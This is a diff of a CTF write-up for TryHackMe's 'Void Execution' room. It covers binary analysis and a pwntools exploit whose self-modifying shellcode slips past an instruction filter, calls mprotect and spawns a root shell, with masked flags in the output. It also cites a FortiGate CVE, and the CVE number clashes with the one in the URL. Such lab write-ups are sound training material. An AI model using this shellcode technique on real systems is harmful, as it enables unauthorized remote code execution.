@@ -2,7 +2,7 @@
 <p align="center"><img width="80px" src="https://github.com/user-attachments/assets/8e9f37ca-b0ce-444d-b596-7429179628a6"><br>
 2025, September 13<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>,<br>
 and I’m excited to join you on this adventure, part of my <code>495</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>
-<em></em>Learn how to bypass restrictions in Linux exploit development</em>.<br>
+<em>Learn how to bypass restrictions in Linux exploit development</em>.<br>
 Access it <a href="https://tryhackme.com/room/hfb1voidexecution">here</a>.<br>
 <img width="1200px" src="https://github.com/user-attachments/assets/650c0463-3dfd-4798-b07d-b6df74ef543a"></p>
 
@@ -30,6 +30,19 @@ This challenge was originally a part of the Hackfinity Battle 2025 CTF Event.</p
 <br>
 
 
+<h2>nmap</h2>
+<p>
+
+- ogs-sever =  Open Grid Services Server/p>
+
+```bash
+:~/VoidExecution# nmap -p 9008 xx.xxx.xx.xxx
+...
+PORT     STATE SERVICE
+9008/tcp open  ogs-server
+```
+
+<h2>Task File</h2>
 <p>
 
 - downloaded the zipped Task File<br>
@@ -57,12 +70,20 @@ libc.so.6: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamica
 
 ```bash
 :~/VoidExecution# file voidexec
-]voidexec: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=4d5a5e48c62c321224d9826c7f688051ff95e54b, not stripped
+voidexec: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=4d5a5e48c62c321224d9826c7f688051ff95e54b, not stripped
 ```
 
 <br>
 <br>
 <p><em>main</em> function</p>
+
+<p></p>
+
+- <code>001012eb</code> = function <code>main</code> address<br>001012eb — 0x00100000 = <code>0x12eb<code><br><br><strong>main() offset</strong> at <code>0x12eb</code><br><br>
+- identified <code>__s = (code *)mmap((void *)0xc0de0000, 100, 7, 0x22, -1, 0);</code> in function <code>main</code><br><br>
+- <code>mmap</code< is mapping<br>address <code>0xc0de0000</code><br>lenght <code>100</code><br>ROT_READ <code>7</code><br>MAP_PRIVATE <code>0x22</code><br>fd <code>-1</code><br>offset <code>0</code><br><br>
+- <code>0X00101100</code> = <code>mprotect(__s,100,4);</code> address<br>0x00101100 — 0x00100000 = <code>0x1100<code></p>
+0x00101100 — 0x00100000 = <code>0x1100</code><br><strong>mprotect offset</strong> at <code>0x1100</code></p>
 
 <img width="1294" height="590" alt="image" src="https://github.com/user-attachments/assets/8799e3d0-1eab-4224-9406-1cda5c4e8453" />
 
@@ -101,6 +122,9 @@ undefined8 main(void)
 <br>
 <br>
 <p><em>forbidden</em> function</p>
+<p>
+
+- identified that function <code>forbidden</code> returns TRUE if "disallowed instructions" are provided</p>
 
 <img width="1306" height="546" alt="image" src="https://github.com/user-attachments/assets/37287d88-2148-40e1-8bab-e03c5d5b0ead" />
 
@@ -132,10 +156,9 @@ undefined8 forbidden(long param_1)
 
 <br>
 <h2>CVE-2022-42465</h2>
-<h3>Remotely exploitable heap overflow in the SSL VPN component of FortiGate and FortiProxy appliances</h3>
-
 <p>
 
+- CVE-2022-42465 : remotely exploitable heap overflow in the SSL VPN component of FortiGate and FortiProxy appliances<br><br>
 - cloned https://<code>bishopfox.com/blog/exploit-cve-2022-42475</code><br>
 - customized IP and Port<br>
 - build a virtual environment<br>
@@ -201,157 +224,69 @@ voided!
 
 <br>
 <h2>Script</h2>
-
-<p>
-
-- downloaded <a href="https://github.com/w3irdo21/tryhackme-rooms/blob/main/hfb1voidexecution.py">w3irdo21</a>´s script<br>
-- executed it</p>
+<p>by <a href="https://tryhackme.com/room/hfb1voidexecution">here</a>.</p>
 
 ```bash
-(rose) ...:~/VoidExecution# cat script.py
 #!/usr/bin/env python3
-
-'''
-
-Room Script: https://tryhackme.com/room/hfb1voidexecution
-Medium Article for explanation: https://medium.com/@Sle3pyHead/void-execution-tryhackme-ctf-notes-45c0545b5f10
-
-'''
-
 from pwn import *
-import sys
-
+# Adjust target IP and port as needed
+target = remote("xx.xxx.xxx.xx", 9008)
 context.arch = 'amd64'
-context.os = 'linux'
-context.log_level = 'info'
-
-# Target configuration
-HOST = "xx.xxx.xx.xxx"
-PORT = 9008
-
-# From our Ghidra analysis:
-# main function at 0x12eb
-# mprotect PLT at 0x1100 
-MAIN_OFFSET = 0x12eb
-MPROTECT_OFFSET = 0x1100
-
-def create_exploit():
-    shellcode = asm(f"""
-        /* Assume r13 holds main address at runtime */
-        /* Calculate mprotect address: main_base - main_offset + mprotect_plt_offset */
-        lea rbx, [r13 - {MAIN_OFFSET} + {MPROTECT_OFFSET}]
-        
-        /* Call mprotect(0xc0de0000, 100, 7) */
-        mov rdi, 0xc0de0000         /* address */
-        mov rsi, 0x64               /* length (100 bytes) */
-        mov rdx, 0x7                /* PROT_READ|PROT_WRITE|PROT_EXEC */
-        call rbx                    /* mprotect() */
-
-        /* Setup execve("/bin/sh", NULL, NULL) */
-        xor rsi, rsi                /* argv = NULL */
-        xor rdx, rdx                /* envp = NULL */
-        mov rax, 0x3b               /* sys_execve */
-      
-        /* Push "/bin/sh" string to stack */
-        mov rdi, 0x68732f6e69622f   /* "/bin/sh" */
-        push rdi
-        mov rdi, rsp                /* rdi points to "/bin/sh" on stack */
-        
-        /* Self-modifying syscall patch - GENIUS TECHNIQUE! */
-        /* Start with safe bytes 0x0e04, increment to get 0x0f05 */
-        inc byte ptr [rip + syscall_patch]      /* 0x0e -> 0x0f */
-        inc byte ptr [rip + syscall_patch + 1]  /* 0x04 -> 0x05 */
-        
-        syscall_patch:
-        .byte 0x0e, 0x04            /* Will become 0x0f, 0x05 (syscall) */
-    """)
-
-    return shellcode
-
-def exploit():
-    try:
-        # Connect to target
-        target = remote(HOST, PORT, timeout=15)
-        log.info(f"Connected to {HOST}:{PORT}")
-        
-        # Generate shellcode
-        shellcode = create_exploit()
-        log.info(f"Shellcode size: {len(shellcode)} bytes")
-        
-        # Check for obvious forbidden bytes (should be clean)
-        forbidden = [0x0f, 0xcd]
-        for i, byte in enumerate(shellcode):
-            if byte in forbidden:
-                log.warning(f"Forbidden byte 0x{byte:02x} at offset {i}")
-        
-
-        # Wait for prompt and send exploit
-        target.recvuntil(b"Send to void execution:")
-        target.sendline(shellcode)
-        
-        log.success("Exploit sent! Attempting to interact...")
-       
-        # Test shell
-        target.sendline(b"id")
-        target.sendline(b"whoami")
-        target.sendline(b"ls -la")
-      
-        # Look for flag  
-        target.sendline(b"find / -name '*flag*' -type f 2>/dev/null")
-        target.sendline(b"cat flag.txt")
-        target.sendline(b"cat /flag.txt")
-        target.sendline(b"cat /root/flag.txt")
-        target.sendline(b"cat /home/*/flag.txt")
-        
-        target.interactive()
-
-        
-    except Exception as e:
-        log.error(f"Exploit failed: {e}")
-
-if __name__ == "__main__":
-    exploit()
+# These offsets must be obtained from analyzing the local ELF binary
+main_offset = 0x12eb         # Replace with actual main offset
+mprotect_offset = 0x1100     # Replace with actual mprotect PLT offset
+# Base address is 0xc0de0000, length 100 bytes
+shellcode = asm(f"""
+    /* Compute mprotect address from r13 (holds main at runtime) */
+    lea rbx, [r13 - {main_offset} + {mprotect_offset}]
+    mov rdi, 0xc0de0000       /* address to change perms */
+    mov rsi, 0x64             /* length */
+    mov rdx, 0x7              /* PROT_READ | WRITE | EXEC */
+    call rbx                  /* mprotect(addr, len, prot) */
+    /* Setup execve("/bin/sh", NULL, NULL) */
+    xor rsi, rsi
+    xor rdx, rdx
+    mov rax, 0x3b             /* syscall: execve */
+    mov rdi, 0x68732f6e69622f
+    push rdi
+    mov rdi, rsp
+    /* Self-modifying syscall patch */
+    inc byte ptr [rip + syscall]
+    inc byte ptr [rip + syscall + 1]
+    syscall:
+    .byte 0x0e, 0x04          /* placeholder for syscall */
+""")
+print(f"[+] Sending {len(shellcode)} bytes of shellcode...")
+target.recvuntil(b"Send to void execution:")
+target.sendline(shellcode)
+target.interactive()
 ```
 
+<img width="907" height="464" alt="image" src="https://github.com/user-attachments/assets/57a83c83-93fc-4c14-8191-f3c7afc9eab3" />
+
+<br>
+<br>
+
 ```bash
-(rose) r...:~/VoidExecution# python3 script.py
-[+] Opening connection to xx.xxx.xx.xxx on port 9008: Done
-[*] Connected to xx.xxx.xx.xxx:9008
-[*] Shellcode size: 74 bytes
-[+] Exploit sent! Attempting to interact...
+(rose) ...:~/VoidExecution# python3 script.py
+[*] Checking for new versions of pwntools
+    To disable this functionality, set the contents of /root/.cache/.pwntools-cache-3.8/update to 'never' (old way).
+    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):
+        [update]
+        interval=never
+[*] A newer version of pwntools is available on pypi (4.13.1 --> 4.14.1).
+    Update with: $ pip install -U pwntools
+[+] Opening connection to xx.xxx.xxx.xx on port 9008: Done
+[+] Sending 74 bytes of shellcode...
 [*] Switching to interactive mode
  
 
 voided!
 
-uid=0(root) gid=0(root) groups=0(root)
-root
-total 6744
-drwxr-xr-x 1 root root    4096 Mar 19 06:23 .
-drwxr-xr-x 1 root root    4096 Mar 19 06:23 ..
--rwxrwxr-x 1 root root      31 Mar 19 06:04 flag.txt
--rwxrwxr-x 1 root root  240936 Mar 19 05:58 ld-linux-x86-64.so.2
--rwxrwxr-x 1 root root 6618136 Mar 19 05:58 libc.so.6
--rwxrwxr-x 1 root root   20504 Mar 19 06:02 voidexec
-/sys/devices/pnp0/00:04/00:04:0/00:04:0.0/tty/ttyS0/flags
-/sys/devices/platform/serial8250/serial8250:0/serial8250:0.3/tty/ttyS3/flags
-/sys/devices/platform/serial8250/serial8250:0/serial8250:0.1/tty/ttyS1/flags
-/sys/devices/platform/serial8250/serial8250:0/serial8250:0.2/tty/ttyS2/flags
-/sys/devices/virtual/net/eth0/flags
-/sys/devices/virtual/net/lo/flags
-/sys/module/scsi_mod/parameters/default_dev_flags
-/proc/sys/kernel/acpi_video_flags
-/proc/sys/net/ipv4/fib_notify_on_flag_change
-/proc/sys/net/ipv6/fib_notify_on_flag_change
-/proc/kpageflags
-/home/ctf/flag.txt
-THM{*************************}
-THM{*************************}
 $ id
 uid=0(root) gid=0(root) groups=0(root)
 $ pwd
 /home/ctf
-$ ll
 $ ls
 flag.txt
 ld-linux-x86-64.so.2
@@ -359,11 +294,11 @@ libc.so.6
 voidexec
 $ cat flag.txt
 THM{*************************}
+$  
 ```
 
 <p>1.1. What is the flag?<br>
 <code>THM{*************************}</code><br>
-
 
 <br>
 <br>
@@ -378,9 +313,11 @@ THM{*************************}
 
 | Date              | Room                                  |Streak   |   All Time<br>Global   |   All Time<br>Brazil   |   Monthly<br>Global   |   Monthly<br>Brazil  | Points   | Rooms<br>Completed     | Badges    |
 |:------------------|:--------------------------------------|--------:|:-----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
-| 2025, Sep 10      |Medium 🚩 - <code><strong>Devie</strong></code>                       | 494    |     110ᵗʰ    |      5ᵗʰ     |     607ᵗʰ    |     9ᵗʰ    | 125,606  |    959    |    73     |
-| 2025, Sep 10      |Medium 🚩 - Backtrack, in progress     | 493    |     110ᵗʰ    |      5ᵗʰ     |     629ᵗʰ    |     9ᵗʰ    | 125,516  |    958    |    73     |
-| 2025, Sep 10      |Easy 🔗 - Detecting Web Attacks        | 493    |     110ᵗʰ    |      5ᵗʰ     |     629ᵗʰ    |     9ᵗʰ    | 125,516  |    958    |    73     |
+| 2025, Sep 13      |Medium 🚩 - <code><strong>Void Execution</strong></code>| 494  | 107ᵗʰ | 5ᵗʰ  |     383ʳᵈ    |     6ᵗʰ    | 126,120  |    961    |    73     |
+| 2025, Sep 12      |Easy 🚩 - Invite Only                  | 494    |     110ᵗʰ    |      5ᵗʰ     |     352ⁿᵈ    |     6ᵗʰ    | 126,056  |    960    |    73     |
+| 2025, Sep 12      |Medium 🚩 - Devie                      | 494    |     110ᵗʰ    |      5ᵗʰ     |     607ᵗʰ    |     9ᵗʰ    | 125,606  |    959    |    73     |
+| 2025, Sep 11      |Medium 🚩 - Backtrack, in progress     | 493    |     110ᵗʰ    |      5ᵗʰ     |     629ᵗʰ    |     9ᵗʰ    | 125,516  |    958    |    73     |
+| 2025, Sep 11      |Easy 🔗 - Detecting Web Attacks        | 493    |     110ᵗʰ    |      5ᵗʰ     |     629ᵗʰ    |     9ᵗʰ    | 125,516  |    958    |    73     |
 | 2025, Sep 10      |Easy 🔗 - Attacking ICS Plant #1       | 492    |     110ᵗʰ    |      5ᵗʰ     |     675ᵗʰ    |     9ᵗʰ    | 125,428  |    957    |    73     |
 | 2025, Sep 10      |Easy 🔗 - SOC Role in Blue Team        | 492    |     110ᵗʰ    |      5ᵗʰ     |     664ᵗʰ    |     9ᵗʰ    | 125,292  |    956    |    73     |
 | 2025, Sep 9       |Hard 🚩 - Python Playground            | 491    |     111ˢᵗ    |      5ᵗʰ     |     693ʳᵈ    |     9ᵗʰ    | 125,236  |    955    |    73     |
@@ -406,11 +343,11 @@ THM{*************************}
 
 <br>
 
-<p align="center">Global All Time:   110ᵗʰ<br><img width="250px" src="https://github.com/user-attachments/assets/a90981d1-bf1c-4659-ad55-185cc6c4a23a"><br>
-                                              <img width="1200px" src="https://github.com/user-attachments/assets/18299e44-c9b8-4a9c-badf-93633f988ce8"><br><br>
-                  Brazil All Time:     5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/ebc74cb0-a55d-4519-9816-bc1ea279ea63"><br>
-                  Global monthly:    607ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/2618bb6f-b10f-4187-90f5-ec08996768a5"><br>
-                  Brazil monthly:      9ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/6df8e9b5-e47f-4477-ba22-bbff35f7dff4"><br>
+<p align="center">Global All Time:   110ᵗʰ<br><img width="250px" src="https://github.com/user-attachments/assets/bb0dd33a-7b53-402d-ad45-1bbe804e8570"><br>
+                                              <img width="1200px" src="https://github.com/user-attachments/assets/581c63e5-e9af-4ae4-afcd-b83c4d7271ab"><br><br>
+                  Brazil All Time:     5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/8274a817-f7d1-4c9a-b410-323008c675a2"><br>
+                  Global monthly:   383ʳᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/cc3c0fd5-33c1-40fe-8655-481a5fde5fa4"><br>
+                  Brazil monthly:      9ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/43f9633d-1260-44bc-ac6a-7f5615e4e1c8"><br>
 
 <h2 align="center">Thanks for coming!</h2>
 <p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>  
